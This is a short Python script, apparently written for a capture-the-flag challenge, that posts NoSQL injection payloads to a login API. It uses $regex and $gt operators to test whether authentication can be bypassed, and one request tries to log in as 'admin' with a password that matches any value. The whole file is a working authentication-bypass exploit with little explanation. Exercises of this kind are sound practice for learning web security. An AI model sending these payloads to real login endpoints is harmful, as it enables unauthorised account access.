import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# Ah, $regex without anchors might just be matching something else or maybe it's just always returning true because of something?
# Let's test a negative case to be sure.
payload = {"username": {"$regex": "^XYZ123NONEXISTENT.*"}, "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("Negative case:", r.status_code)

payload = {"username": "admin", "password": {"$gt": ""}}
r = requests.post(url, json=payload, headers=headers)
print("Admin case:", r.status_code)
